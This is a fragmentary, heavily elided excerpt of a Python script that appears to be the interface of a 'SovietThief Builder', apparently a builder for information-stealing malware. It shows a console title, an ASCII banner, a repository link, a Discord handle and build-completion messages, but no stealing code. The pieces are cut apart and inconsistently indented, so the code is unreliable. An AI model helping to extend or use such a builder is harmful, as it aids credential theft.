...
ctypes.windll.kernel32.SetConsoleTitleW(f" SovietThief Builder - {username}")
os.system("cls")
...
╚══════╝ ╚═════╝   ╚═══╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
                ...
                https://github.com/sovietmember/sovietthief
...
╚══════╝ ╚═════╝   ╚═══╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
          ...
          github.com/sovietmember/sovietthief | discord : zdetp                             
"""
...
with open(filepath, "w", encoding="utf-8") as f:
        ...
        if answer.upper() == "Y":
                    ...
                    time.sleep(1)
                    print(Fore.CYAN + "Don't forget to star the repo" + Style.RESET_ALL)
                    time.sleep(3)
        elif answer.upper() == "N":
              print(f"\n{Fore.GREEN}Build process has been done successfully!{Fore.RESET}")
              time.sleep(1)
